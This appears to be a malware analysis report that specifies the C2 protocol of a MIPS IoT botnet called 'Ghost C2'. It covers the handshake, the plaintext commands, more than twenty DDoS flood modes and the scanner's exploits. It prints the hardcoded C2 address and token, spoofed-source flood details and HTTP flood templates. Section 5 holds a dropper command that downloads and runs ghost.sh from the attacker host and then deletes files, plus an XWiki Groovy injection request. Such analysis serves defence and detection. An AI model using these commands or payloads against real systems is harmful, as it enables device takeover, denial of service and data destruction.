# Ghost C2 Botnet — Communication Layer Technical Specification

## Binary Identification

| Attribute | Value |
|-----------|-------|
| **Architecture** | MIPS Little-Endian 32-bit |
| **Format** | ELF executable |
| **C2 Server** | `94.154.43.158` (hardcoded at offset `0x00031514`) |
| **C2 Port** | Configurable via command-line argument `argv[2]`; default `0x913` (2323) |
| **Authentication Token** | `ghostc2botsecretreuisdhfeuishfuish\r\n` (at offset `0x0003157c`, 37 bytes) |
| **Protocol** | Plaintext TCP line-oriented protocol (newline-terminated) |

---

## 1. Session Establishment

### 1.1 Observed Behavior

The malware establishes a C2 session through a simple TCP connection followed by an authentication handshake and system fingerprinting report. The connection loop runs indefinitely, retrying every 10 seconds on failure and reconnecting every 5 seconds on disconnection.

#### Connection Sequence

```
┌─────────────┐     TCP CONNECT      ┌─────────────┐
│   Bot       │ ────────────────────> │   C2 Server │
│             │ <──────────────────── │             │
│             │     AUTH TOKEN        │             │
│             │ ────────────────────> │             │
│             │                       │             │
│             │  ARCH:linux.<arch>    │             │
│             │  <bandwidth>          │             │
│             │ ────────────────────> │             │
└─────────────┘                       └─────────────┘
```

#### Step-by-Step Flow

1. **Connection Attempt**: The bot calls `connect_host(host, port)` which:
   - Creates a TCP socket (`socket(AF_INET, SOCK_STREAM, 0)`)
   - Resolves the hostname via `getaddrinfo()`
   - Connects to the C2 server

2. **Authentication Token Transmission**: Upon successful connection, the bot sends the hardcoded authentication string:
   ```
   ghostc2botsecretreuisdhfeuishfuish\r\n
   ```
   This is a 36-character ASCII string terminated by CRLF (`0x0D 0x0A`), totaling 37 bytes sent via `send_all()`.

3. **System Fingerprinting**: The bot gathers system information:
   - **Architecture**: Executed via `popen("uname -m", "r")` — reads the machine hardware name (e.g., `mips`, `armv7l`, `x86_64`)
   - **OS Release**: Executed via `popen("cat /etc/os-release 2>/dev/null | grep -E '^ID=' | cut -d= -f2 | tr -d '\"'", "r")` — reads the OS distribution ID
   - **BusyBox Detection**: Executed via `popen("busybox --help 2>/dev/null | head -1", "r")` — checks for BusyBox presence by searching for the string `BusyBox` in output
   - **Bandwidth Measurement**: Calls `measure_bandwidth()` (currently returns 0 in this binary variant — stubbed implementation)

4. **Architecture String Construction**:
   - If OS detection succeeds and BusyBox is detected: uses the detected OS ID
   - Otherwise: defaults to `linux.unknown.unknown` or `linux.<arch>.unknown`
   - The architecture identifier is stored as a 32-bit value (first 4 bytes of the architecture name string)

5. **Bandwidth Report**: After fingerprinting, the bot constructs and sends the following formatted message:
   ```
   ARCH:<arch_string> <bandwidth>\r\n
   ```
   Where `<arch_string>` follows the format `linux.<os_id>.<arch>` and `<bandwidth>` is a floating-point value formatted to 2 decimal places.

   **Example**: `ARCH:linux.mips.mips 0.00\r\n`

### 1.2 Handshake Logic (Pseudocode)

```
FUNCTION establish_session(c2_host, c2_port):
    LOOP:
        fd = connect_tcp(c2_host, c2_port)
        IF fd == INVALID:
            PRINT "[CONNECT] Failed, retrying in 10s"
            SLEEP(10)
            CONTINUE

        PRINT "[CONNECT] Connected!"

        // Send authentication token
        send(fd, "ghostc2botsecretreuisdhfeuishfuish\r\n", 37)

        // Gather system information
        arch = popen("uname -m")
        os_id = popen("cat /etc/os-release | grep '^ID=' | cut -d= -f2 | tr -d '\"'")
        busybox_check = popen("busybox --help 2>/dev/null | head -1")
        
        IF os_id == "unknown" OR os_id == EMPTY:
            IF busybox_check CONTAINS "BusyBox":
                os_id = "busybox"
            ELSE:
                os_id = "unknown"

        bandwidth = measure_bandwidth()
        arch_string = FORMAT("linux.%s.%s", os_id, arch)
        report = FORMAT("ARCH:%s %.2f\r\n", arch_string, bandwidth)

        send(fd, report, strlen(report))

        // Enter command loop
        command_loop(fd)

        close(fd)
        PRINT "[CONNECT] Disconnected, reconnecting in 5s"
        SLEEP(5)
```

### 1.3 Success/Failure Handling

| Condition | Behavior |
|-----------|----------|
| **Connection failure** | Prints `[CONNECT] Failed, retrying in 10s`, sleeps 10 seconds, retries |
| **Successful connection** | Prints `[CONNECT] Connected!`, proceeds with authentication |
| **Disconnection during command loop** | Closes socket, prints `[CONNECT] Disconnected, reconnecting in 5s`, sleeps 5 seconds, reconnects |
| **Authentication failure** | Not explicitly handled — the binary sends the token regardless of server response |
| **recv_line returns -1** | Socket closed by server; exits command loop, reconnects |

**Analysis Gap**: The binary does not validate any server response after sending the authentication token or architecture report. Session establishment is considered successful solely based on TCP connection success. No challenge-response, session tokens, or server acknowledgment parsing is implemented.

---

## 2. Cryptography

### 2.1 Observed Behavior

The C2 communication protocol uses **no encryption or cryptographic obfuscation** for the command-and-control channel. All data is transmitted in plaintext over TCP.

The binary does implement encoding utilities used exclusively for the **exploit/scanner module** (not the C2 channel):
- **Base64 encoding**: Used in the D-Link exploit payload
- **URL encoding**: Used in the XWiki exploit payload
- **Hex escaping**: Used in the DLink exploit to encode the command string

### 2.2 Specification

#### C2 Channel: No Encryption

| Layer | Protocol | Encryption |
|-------|----------|------------|
| Transport | TCP | None |
| Application | Plaintext line-oriented | None |

All C2 commands, responses, and authentication data are transmitted as raw ASCII text with no cryptographic transformation.

#### Encoding Utilities (Scanner Module Only)

##### Base64 Encoding

**Purpose**: Encode exploit payloads for the D-Link vulnerability exploitation.

**Algorithm**: Standard RFC 4648 Base64 encoding.

**Character Table** (at offset `0x0003169c`):
```
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
```

**Padding**: Uses `=` (0x3D) for padding.

**Implementation**:
```
FUNCTION base64_encode(input_bytes, length):
    output = ALLOCATE((length + 2) / 3 * 4 + 1)
    out_idx = 0
    FOR i FROM 0 TO length STEP 3:
        triplet = 0
        triplet |= input[i] << 16
        IF i + 1 < length:
            triplet |= input[i + 1] << 8
        IF i + 2 < length:
            triplet |= input[i + 2]

        output[out_idx]     = BASE64_TABLE[(triplet >> 18) & 0x3F]
        output[out_idx + 1] = BASE64_TABLE[(triplet >> 12) & 0x3F]
        IF i + 1 < length:
            output[out_idx + 2] = BASE64_TABLE[(triplet >> 6) & 0x3F]
        ELSE:
            output[out_idx + 2] = '='
        IF i + 2 < length:
            output[out_idx + 3] = BASE64_TABLE[triplet & 0x3F]
        ELSE:
            output[out_idx + 3] = '='
        out_idx += 4
    output[out_idx] = '\0'
    RETURN output
```

##### URL Encoding

**Purpose**: Encode payload data for the XWiki exploit HTTP request.

**Algorithm**: Standard percent-encoding with special handling for space character.

**Implementation**:
```
FUNCTION url_encode(input_string):
    output = ALLOCATE(strlen(input) * 3 + 1)
    FOR EACH byte b IN input:
        IF b IS alphanumeric OR b IN {'-', '_', '.', '~'}:
            output += b
        ELSE IF b == ' ':
            output += '+'
        ELSE:
            output += FORMAT("%%%02X", b)
    RETURN output
```

##### Hex Escaping

**Purpose**: Encode shell commands for the D-Link exploit CGI parameter.

**Algorithm**: Each byte is converted to a 4-character lowercase hex string with `\x` prefix.

**Format String**: `\\x%02x` (at offset `0x0003034c`)

**Implementation**:
```
FUNCTION hex_escape_command(input_string):
    output = ALLOCATE(strlen(input) * 4 + 1)
    FOR EACH byte b IN input:
        output += FORMAT("\\x%02x", b)
    RETURN output
```

**Example**: The shell command `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://94.154.43.158/ghost.sh; ...` is hex-escaped and then Base64-encoded for transmission in the exploit payload.

### 2.3 Decryption Routine

No decryption is required for C2 communication. All received data is processed directly as plaintext ASCII.

---

## 3. Main Command Loop

### 3.1 Observed Behavior

The command processing loop operates on a line-oriented protocol where each newline-terminated line from the C2 server is parsed as a single command. The bot reads one byte at a time until a newline character (`\n`, 0x0A) is received.

#### Command Reception Flow

```
┌─────────────┐     RECV_LINE      ┌─────────────┐
│   Bot       │ <────────────────── │   C2 Server │
│             │  strtok(command)    │             │
│             │  IF "PING"          │             │
│             │  → send "PONG\r\n"  │             │
│             │  IF attack_cmd      │             │
│             │  → start_attack()   │             │
│             │                     │             │
│             │  RECV_LINE          │             │
│             │ <────────────────── │             │
└─────────────┘                     └─────────────┘
```

#### Step-by-Step Processing

1. **Line Reception**: `recv_line(fd, buffer, 0x2000)` reads bytes one at a time into a buffer (max 8191 bytes + null terminator) until a newline is received.

2. **Token Parsing**: The received line is parsed using `strtok(buffer, " ")` (space delimiter at offset `0x0003165c`).

3. **Command Dispatch**:
   - **First token** is compared against known command strings
   - If the command matches `PING`, the bot responds with `PONG\r\n` (6 bytes)
   - If the command matches any attack type, additional tokens are parsed for target, port, and duration

4. **Attack Launch**: For attack commands, `start_attack(command, target, port, duration)` is called, which spawns multiple threads (determined by attack type).

### 3.2 Protocol Specification

#### Message Format

| Field | Position | Format | Description |
|-------|----------|--------|-------------|
| Command | Token 1 | ASCII string | Attack type identifier |
| Target | Token 2 | IP address string | Target host (IPv4 dotted decimal) |
| Port | Token 3 | Integer decimal | Target port number |
| Duration | Token 4 | Integer decimal | Attack duration in seconds (capped at 0xE10 = 3600) |

**Line Format**: `<command> <target_ip> <port> <duration>\n`

**Example**: `UDP-BIG 192.168.1.1 80 60\n`

#### Delimiter

- **Token separator**: Space character (`0x20`)
- **Line terminator**: Newline character (`0x0A`)

#### Command Definitions

The following commands are recognized by the malware (identified by string comparison against hardcoded values):

##### Keepalive Command

| Command | Handler | Description |
|---------|---------|-------------|
| `PING` | Inline | Responds with `PONG\r\n` |

**Response Format**: `PONG\r\n` (6 bytes: `P`, `O`, `N`, `G`, `\r`, `\n`)

##### UDP Flood Attacks

| Command | Payload Size | Socket Type | Thread Count | Description |
|---------|-------------|-------------|-------------|-------------|
| `UDP` | 0xFFE3 (65507) bytes | UDP (`SOCK_DGRAM`) | 4 | Random byte fill, SO_REUSEADDR set |
| `UDP-BIG` | 0xFFE3 (65507) bytes | UDP (`SOCK_DGRAM`) | 2 | 'A' (0x41) fill, single socket |
| `UDP-PLAIN` | 0x578 (1400) bytes | UDP (`SOCK_DGRAM`) | 2 | Random byte fill |
| `UDP-BYPASS` | N/A (raw socket) | RAW (`IPPROTO_UDP`) | 4 | DNS-query format with spoofed source IPs, random domain names |

**UDP-BYPASS Details**: Constructs DNS query packets with:
- Random source IP from pool: `8.8.8.8`, `1.1.1.1`, `9.9.9.9`, `208.67.222.222`, `64.6.64.6`
- Random domain name generation (variable length, lowercase letters with dots)
- DNS query header with transaction ID and flags

##### TCP Flood Attacks

| Command | Payload Size | Socket Type | Thread Count | Description |
|---------|-------------|-------------|-------------|-------------|
| `BANDWIDTH-UDP` | 0xFFE3 (65507) bytes | UDP (`SOCK_DGRAM`) | 6 | SO_SNDBUF set, 'A' fill |
| `PPS-UDP` | 0x80 (128) bytes | UDP (`SOCK_DGRAM`) | 6 | Random byte fill, small packets |
| `BANDWIDTH-TCP` | 1000/2048 bytes | TCP (`SOCK_STREAM`) | 4 | Connect + send, alternating sizes |
| `PPS-TCP` | 0x10000 (65536) bytes | TCP (`SOCK_STREAM`) | 4 | Connect + send, large payload |
| `TCPBYPASS` | 0x40 (64) bytes | TCP (`SOCK_STREAM`) | 4 | MSG_DONTROUTE flag, reconnect on failure |

##### TCP Raw Packet Attacks

| Command | Socket Type | Description |
|---------|-------------|-------------|
| `SYN` | RAW (`IPPROTO_TCP`) | Raw TCP SYN flood with randomized source port/IP, proper checksum calculation |
| `TCPBYPASS` (raw variant) | RAW (`IPPROTO_TCP`) | Raw TCP flood with FIN+URG+PSH flags (Xmas-style) |

**SYN Attack Details**:
- IP Header: Version 4, IHL 5, TTL 64, protocol 6
- TCP Header: SYN flag set, random sequence numbers, MSS option
- Source port: Random (0x400–0xFFF)
- Destination port: From command parameter
- Checksums: Both IP and TCP checksums calculated

**TCPBYPASS (Raw) Details**:
- IP Header: Same as SYN
- TCP Header: FIN + URG + PSH flags (0x39), window 0xFFFF
- MSS option: Random value between 1400–1495

##### Specialized UDP Attacks

| Command | Payload Size | Behavior | Description |
|---------|-------------|----------|-------------|
| `OVHDROP` | 0x5b4 (1460) bytes random, alternates with 0x4f (79) byte payload | Every 50 packets, sends OVH-specific payload instead of random | OVH DDoS mitigation bypass |
| `UDPHEX` | 0x5b2 (1458) bytes | Random byte fill | High-speed UDP flood |
| `OVH` | 0x76 (118) bytes | Fixed payload, counter resets every 49 packets | OVH-specific bypass payload |
| `MIX` | 1000/2048 bytes | Alternates between UDP and TCP connections | Mixed protocol flood |

**OVHDROP Payload** (at offset `0x00030e98`, 79 bytes):
```
"Self Rep Fuck Find NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS\n"
```

**OVH Payload** (at offset `0x00030dcc`, 118 bytes):
```
"dayzddos.co runs you if you read this lol then you tcp dumped it because it hit you and you need to patch it lololololol"
```

##### Game Server Attacks

| Command | Protocol | Payload | Description |
|---------|----------|---------|-------------|
| `FIVEM` | UDP | `getinfo xxx` (12 bytes) | FiveM GTA V server query flood |
| `VSE` | UDP | `TSource Engine Query` (20 bytes) | Valve Source Engine query flood |
| `MCPE` | UDP | Custom payload (60 bytes) | Minecraft Pocket Edition server query flood |
| `HEX` | UDP | `UUUU` (4 bytes repeated to 8 bytes) | Generic hex payload flood |

**MCPE Payload** (at offset `0x00030d78`, 60 bytes):
```
"atom data ontop my own ass amp/triphent is my dick and balls"
```

**FIVEM Payload** (at offset `0x00030d44`, 12 bytes):
```
"getinfo xxx"
```

**VSE Payload** (at offset `0x00030d58`, 20 bytes):
```
"TSource Engine Query"
```

**HEX Payload** (at offset `0x00030dbc`, 8 bytes):
```
0x55 0x55 0x55 0x55 0x00 0x00 0x00 0x01
```

##### HTTP Attacks

| Command | Method | Thread Count | Description |
|---------|--------|-------------|-------------|
| `HTTPGET` | GET | N/A (sequential) | HTTP GET flood with random User-Agent |
| `HTTPPOST` | POST | N/A (sequential) | HTTP POST flood with form data |
| `BROWSER` | GET / | N/A (sequential) | Full browser simulation with Accept headers |
| `BROWSER-2` | GET /login | N/A (sequential) | Login page simulation with Referer |
| `BROWSER-3` | POST /search?q=test | N/A (sequential) | Search page simulation |

**HTTPGET Template**:
```
GET / HTTP/1.1\r\n
Host: %s\r\n
User-Agent: %s\r\n
Connection: keep-alive\r\n
\r\n
```

**HTTPPOST Template**:
```
POST / HTTP/1.1\r\n
Host: %s\r\n
User-Agent: %s\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: %zu\r\n
Connection: close\r\n
\r\n
<post_body>
```

**HTTPPOST Body** (92 bytes at offset `0x00031440`):
Hex-encoded string that decodes to:
```
username=admin&password=password123&email=admin@example.com&submit=login
```

**BROWSER Template**:
```
GET / HTTP/1.1\r\n
Host: %s\r\n
User-Agent: %s\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n
Accept-Encoding: gzip, deflate, br\r\n
Accept-Language: en-US,en;q=0.5\r\n
Connection: close\r\n
Upgrade-Insecure-Requests: 1\r\n
Cache-Control: max-age=0\r\n
Pragma: no-cache\r\n
\r\n
```

**BROWSER-2 Template**:
```
GET /login HTTP/1.1\r\n
Host: %s\r\n
User-Agent: %s\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n
Accept-Encoding: gzip, deflate\r\n
Accept-Language: en-US,en;q=0.9\r\n
Connection: close\r\n
Referer: http://%s/\r\n
Upgrade-Insecure-Requests: 1\r\n
\r\n
```

**BROWSER-3 Template**:
```
POST /search?q=test HTTP/1.1\r\n
Host: %s\r\n
User-Agent: %s\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 9\r\n
Connection: close\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Encoding: gzip, deflate\r\n
Accept-Language: en-US,en;q=0.9\r\n
\r\n
q=test
```

##### Minecraft Java Attack

| Command | Protocol | Description |
|---------|----------|-------------|
| `MCJAVA` | TCP | Minecraft Java Edition protocol-level attack |

**MCJAVA Attack Flow**:
1. Connect to target on specified port
2. Send handshake packet (10 bytes at offset `0x00030ec4`)
3. Send status request packet (at offset `0x00030ed4`)
4. Receive response (up to 0x1000 bytes)
5. Send ping packet (9 bytes at offset `0x00030edc`)
6. Close connection
7. Sleep 10 seconds, repeat

**MCJAVA Handshake Packet** (10 bytes at `0x00030ec4`):
```
0x10 0x00 0x04 0x04 0x54 0x55 0x54 0x54 0x00 0x00
```
This follows the Minecraft protocol format: varint protocol version + hostname length + hostname bytes + port + mode.

**MCJAVA Ping Packet** (9 bytes at `0x00030edc`):
```
0x09 0x00 0x01 0x00 0x00 0x00 0x00 0x00 0x09
```

##### ADMIN-UDP Attack

| Command | Protocol | Payload | Description |
|---------|----------|---------|-------------|
| `ADMIN-UDP` | UDP | 0xFFE3 (65507) bytes | High-performance multi-socket UDP flood |

**ADMIN-UDP Details**:
- Creates 10 concurrent UDP sockets
- Sets SO_SNDBUF to 0x6400000 (104 MB) and SO_RCVBUF to 6
- Uses non-blocking I/O (`O_NONBLOCK`)
- Sends 0xFFE3-byte random payloads
- Implements adaptive rate limiting based on packet counters and timing
- Every 50 packets per socket, sends a smaller random payload (0x200–0xFFF bytes)
- Rate limiting activates based on elapsed time thresholds

### 3.3 Message Processing Logic (Pseudocode)

```
FUNCTION command_loop(fd):
    buffer = ALLOCATE(0x2000)
    LOOP:
        result = recv_line(fd, buffer, 0x2000)
        IF result <= 0:
            BREAK  // Connection closed

        // Parse first token (command)
        command = strtok(buffer, " ")
        IF command == NULL:
            CONTINUE

        // Handle PING keepalive
        IF command == "PING":
            send(fd, "PONG\r\n", 6)
            CONTINUE

        // Check if command is a known attack type
        IF command IN attack_commands:
            target = strtok(NULL, " ")
            port_str = strtok(NULL, " ")
            duration_str = strtok(NULL, " ")

            IF target != NULL AND port_str != NULL AND duration_str != NULL:
                port = atoi(port_str)
                duration = atoi(duration_str)

                // Cap duration at 3600 seconds
                IF duration > 0xE10:
                    duration = 0xE10

                PRINT "[ATTACK] %s %s:%d for %ds", command, target, port, duration
                start_attack(command, target, port, duration)

attack_commands = {
    "UDP", "UDP-BIG", "UDP-PLAIN", "UDP-BYPASS",
    "BANDWIDTH-UDP", "PPS-UDP", "BANDWIDTH-TCP", "PPS-TCP",
    "TCPBYPASS", "OVHDROP", "UDPHEX", "OVH", "MIX", "SYN",
    "FIVEM", "VSE", "MCPE", "HEX",
    "HTTPGET", "HTTPPOST", "BROWSER", "BROWSER-2", "BROWSER-3",
    "MCJAVA", "ADMIN-UDP"
}

FUNCTION recv_line(fd, buffer, max_len):
    count = 0
    LOOP:
        IF count + 1 >= max_len:
            RETURN count
        bytes_read = recv(fd, temp, 1, 0)
        IF bytes_read < 1:
            RETURN -1
        buffer[count] = temp[0]
        buffer[count + 1] = '\0'
        count += 1
        IF temp[0] == '\n':
            RETURN count
```

### 3.4 Attack Thread Spawning (`start_attack`)

The `start_attack` function creates multiple concurrent threads per attack command, with thread counts determined by attack type:

| Attack Type | Thread Count | Rationale |
|-------------|-------------|-----------|
| `UDP`, `UDP-BIG`, `UDP-PLAIN`, `UDP-BYPASS` | 4 | Moderate parallelism |
| `BANDWIDTH-UDP`, `PPS-UDP`, `BANDWIDTH-TCP`, `PPS-TCP`, `TCPBYPASS`, `OVHDROP`, `UDPHEX`, `OVH`, `MIX`, `SYN` | 6 | Higher parallelism for bandwidth attacks |
| `HTTPGET`, `HTTPPOST`, `BROWSER`, `BROWSER-2`, `BROWSER-3`, `MCJAVA`, `ADMIN-UDP` | 4 | Sequential within each thread |
| `FIVEM`, `VSE`, `MCPE`, `HEX` | 2 | Single socket per thread |

**Thread Data Structure** (288 bytes per thread):
```
struct attack_args {
    char command[16];      // offset 0x00, attack type string (null-terminated at byte 15)
    char target[256];      // offset 0x10, target IP string (null-terminated at byte 0xFF)
    uint32_t port;         // offset 0x110, target port
    uint32_t duration;     // offset 0x114, attack duration in seconds
    int thread_id;         // offset 0x118, sequential thread index
    uint32_t rand_seed;    // offset 0x11C, seed = time() ^ (thread_id * 0x9E3779B9)
};
```

**Thread Execution**:
```
FUNCTION attack_loop(args):
    SYNC_INCREMENTS(active_attack_count)
    end_time = current_time() + args.duration
    target_addr = sockaddr_in(args.port, args.target)

    SWITCH args.command:
        CASE "FIVEM":  flood_udp(target_addr, fivem_payload, 12, end_time)
        CASE "VSE":    flood_udp(target_addr, vse_payload, 20, end_time)
        CASE "MCPE":   flood_udp(target_addr, mcpe_payload, 60, end_time)
        CASE "HEX":    flood_udp(target_addr, hex_payload, 8, end_time)
        CASE "UDP-BIG": flood_udp_big(target_addr, end_time)
        CASE "UDP":     flood_udp_random(target_addr, 0xFFE3, end_time)
        // ... (other attack handlers)

    SYNC_DECREMENTS(active_attack_count)
    FREE(args)
```

### 3.5 Dynamic Command Registration

**Analysis Finding**: The malware does **not** support dynamic command registration. All attack commands are hardcoded as string comparisons within the main loop and `attack_loop` function. New commands would require binary modification.

---

## 4. ACKs & Keepalives

### 4.1 Observed Behavior

The botnet implements a minimal keepalive mechanism through a simple PING/PONG exchange. There are no explicit ACKs for command reception or execution status reporting.

#### Keepalive Exchange

```
┌─────────────┐     PING\n        ┌─────────────┐
│   C2 Server │ ─────────────────> │   Bot       │
│             │ <────────────────── │             │
│             │     PONG\r\n        │             │
└─────────────┘                     └─────────────┘
```

### 4.2 Response Packet Formats

#### PONG Response

| Field | Value | Size |
|-------|-------|------|
| Text | `PONG` | 4 bytes |
| Line ending | `\r\n` | 2 bytes |
| **Total** | | **6 bytes** |

**Hex Representation**: `0x50 0x4F 0x4E 0x47 0x0D 0x0A`

### 4.3 Feedback Mechanisms

| Mechanism | Implementation | Direction |
|-----------|---------------|-----------|
| Keepalive | `PING` → `PONG\r\n` | Server → Bot |
| Command ACK | **None** | N/A |
| Execution Status | **None** | N/A |
| Error Reporting | **None** | N/A |
| Bandwidth Report | `ARCH:<string> <float>\r\n` during session init | Bot → Server |
| System Info | Included in bandwidth report | Bot → Server |

### 4.4 Feedback Logic (Pseudocode)

```
FUNCTION process_command(fd, line):
    command = strtok(line, " ")

    IF command == "PING":
        // Keepalive response
        send(fd, "PONG\r\n", 6)
        RETURN

    IF command IN attack_commands:
        target = strtok(NULL, " ")
        port = atoi(strtok(NULL, " "))
        duration = atoi(strtok(NULL, " "))

        IF duration > 3600:
            duration = 3600

        // Launch attack — no ACK sent back
        start_attack(command, target, port, duration)

        // No execution status reported
        // No completion notification sent
        // No error reporting on failure
        RETURN

    // Unknown commands are silently ignored
    RETURN
```

### 4.5 Session Lifecycle

| Phase | Trigger | Behavior |
|-------|---------|----------|
| **Initial Connection** | Program start or reconnect | TCP connect to C2, send auth token, send architecture report |
| **Active Session** | Connected and receiving commands | Continuous `recv_line()` loop processing commands |
| **Keepalive** | Server sends `PING` | Bot responds with `PONG\r\n` |
| **Command Execution** | Server sends attack command | Bot spawns threads, returns to command loop immediately (non-blocking) |
| **Disconnection** | `recv_line()` returns -1 or 0 | Close socket, sleep 5 seconds, reconnect |
| **Reconnection** | After disconnect | Full re-authentication sequence (token + arch report) |
| **Graceful Termination** | **Not implemented** | No clean shutdown mechanism |

**Analysis Gap**: There is no explicit session timeout, no heartbeat sent by the bot, and no mechanism for the bot to detect a dead server connection (aside from `recv_line()` blocking indefinitely). The bot relies entirely on server-initiated PING commands for liveness detection.

---

## 5. Scanner/Exploit Module Communication

### 5.1 Overview

The scanner module (`scanner_loop`) operates independently of the main C2 channel. It performs target discovery via DNS and attempts exploitation against discovered targets.

### 5.2 Target Discovery

The scanner generates random public IPv4 addresses and checks if TCP port 8080 (0x1F90) is open:

```
FUNCTION scanner_loop():
    seed = current_time() ^ thread_id()
    LOOP:
        WHILE active_attack_count > 0:
            SLEEP(1)  // Wait for attacks to complete

        target_ip = generate_random_public_ipv4(seed)
        IF is_tcp_port_open(target_ip, 8080, timeout_ms=1000):
            PRINT "[SCAN] open 8080 found %s, launching exploit payload", target_ip
            exploit_target(target_ip)
            SLEEP(1)
        ELSE:
            USLEEP(50000)  // 50ms sleep between attempts
```

### 5.3 Exploit Payloads

Five exploit techniques are attempted sequentially against each target:

| Exploit | Target Service | Payload |
|---------|---------------|---------|
| **XWiki** | XWiki SolrSearch | URL-encoded command in RSS query parameter |
| **TP-Link** | TP-Link router CGI | Form-encoded command in country form |
| **Service** | Generic web service | JSON API command injection |
| **HiK** | HiKVision camera | XML command injection via PUT |
| **D-Link** | D-Link router CGI | Base64-encoded hex-escaped shell command |

**Common Payload** (at offset `0x00030354`):
```
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; 
wget http://94.154.43.158/ghost.sh; 
curl -O http://94.154.43.158/ghost.sh; 
chmod 777 ghost.sh; 
sh ghost.sh; 
tftp 94.154.43.158 -c get ghost.sh; 
chmod 777 ghost.sh; 
sh ghost.sh; 
tftp -r ghost2.sh -g 94.154.43.158 ghost2.sh; 
chmod 777 ghost2.sh; 
sh ghost2.sh; 
ftpget -v -u anonymous -p anonymous -P 21 94.154.43.158 ghost1.sh ghost1.sh; 
sh ghost1.sh; 
rm -rf ghost.sh ghost.sh ghost2.sh ghost1.sh; 
rm -rf *
```

### 5.4 Exploit Request Flow

```
FUNCTION exploit_target(ip):
    PRINT "[EXPLOIT] trying payload on %s", ip
    exploit_try_xwiki(ip)
    exploit_try_tplink(ip)
    exploit_try_service(ip)
    exploit_try_hik(ip)
    exploit_try_dlink(ip)

FUNCTION exploit_try_xwiki(ip):
    payload = FORMAT("}}} {{groovy}} println(\"%s\".execute().text) {{/groovy}}", shell_command)
    encoded = url_encode(payload)
    request = FORMAT(
        "GET /xwiki/bin/view/Main/SolrSearch?media=rss&text=%s HTTP/1.1\r\n"
        "Host: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n",
        encoded, ip
    )
    send_exploit_request(ip, 8080, request)
```

---

## 6. Appendix: Complete String Table References

### 6.1 Attack Command Strings

| Offset | String |
|--------|--------|
| `0x00030eec` | `FIVEM` |
| `0x00030ef4` | `VSE` |
| `0x00030ef8` | `MCPE` |
| `0x00031000` | `HEX` |
| `0x00031004` | `UDP` |
| `0x00031008` | `UDP-BIG` |
| `0x00031010` | `UDP-PLAIN` |
| `0x0003101c` | `UDP-BYPASS` |
| `0x00030f5c` | `BANDWIDTH-UDP` |
| `0x00030f6c` | `PPS-UDP` |
| `0x00030f78` | `BANDWIDTH-TCP` |
| `0x00030f88` | `PPS-TCP` |
| `0x00030f90` | `TCPBYPASS` |
| `0x00030f9c` | `OVHDROP` |
| `0x00030fa4` | `UDPHEX` |
| `0x00030fa8` | `OVH` |
| `0x00030fac` | `MIX` |
| `0x00030fb0` | `SYN` |
| `0x00030fb8` | `HTTPGET` |
| `0x00031008` | `HTTPPOST` |
| `0x000310a0` | `BROWSER` |
| `0x000311cc` | `BROWSER-2` |
| `0x000312f0` | `BROWSER-3` |
| `0x00031420` | `MCJAVA` |
| `0x00031428` | `ADMIN-UDP` |
| `0x00031660` | `PING` |

### 6.2 Protocol Constants

| Offset | Value | Description |
|--------|-------|-------------|
| `0x00031514` | `94.154.43.158` | Default C2 server IP |
| `0x0003157c` | `ghostc2botsecretreuisdhfeuishfuish\r\n` | Authentication token (37 bytes) |
| `0x00031668` | `PONG\r\n` | Keepalive response (6 bytes) |
| `0x0003165c` | ` ` (space) | Command token delimiter |
| `0x00030f28` | `8.8.8.8` | DNS spoofing source IP pool |
| `0x00030f30` | `1.1.1.1` | DNS spoofing source IP pool |
| `0x00030f38` | `9.9.9.9` | DNS spoofing source IP pool |
| `0x00030f40` | `208.67.222.222` | DNS spoofing source IP pool |
| `0x00030f50` | `64.6.64.6` | DNS spoofing source IP pool |

### 6.3 Duration Cap

| Constant | Value | Description |
|----------|-------|-------------|
| `0xE10` | 3600 decimal | Maximum attack duration (seconds) |

---

## 7. Analysis Gaps and Limitations

| Aspect | Status | Details |
|--------|--------|---------|
| **Server-side protocol** | Unknown | Only client-side behavior is observable; server response parsing is not implemented in the binary |
| **Authentication validation** | Unknown | The binary does not check any server response after sending the auth token |
| **Session tokens** | Not present | No session ID or token mechanism observed |
| **Message ordering** | Not enforced | No sequence numbers or message IDs |
| **Error handling** | Minimal | Connection failures trigger reconnection; command parsing failures are silently ignored |
| **Reconnection backoff** | Fixed | 10-second retry on connection failure, 5-second retry on disconnection |
| **Bandwidth measurement** | Stubbed | `measure_bandwidth()` returns 0 in this binary variant |
| **Dynamic commands** | Not supported | All commands are hardcoded string comparisons |
| **Command ACKs** | Not present | No acknowledgment sent for received commands |
| **Execution feedback** | Not present | No status reporting for attack completion or failure |
| **Heartbeat from bot** | Not present | Bot does not send periodic keepalives; relies on server-initiated PING |
